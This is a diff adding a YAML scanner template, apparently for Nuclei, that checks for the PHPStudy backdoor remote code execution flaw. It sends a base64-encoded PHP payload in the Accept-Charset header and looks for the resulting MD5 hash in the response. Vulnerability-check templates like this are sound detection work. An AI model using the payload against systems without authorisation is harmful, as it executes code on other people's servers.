@@ -1,0 +1,23 @@
+id: poc-yaml-phpstudy-backdoor-rce
+info:
+  name: PHPStudy Backdoor Remote Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,phpstudy
+http:
+  - method: GET
+    path:
+      - "/"
+    headers:
+      Accept-Charset: dmFyX2R1bXAobWQ1KDB4MTIzNCkpOw==
+      Accept-Encoding: gzip,deflate
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ee0b86d2e127f776eaaa97d77e078e41"
+      - type: word
+        part: body
+        words:
+          - "(32)"
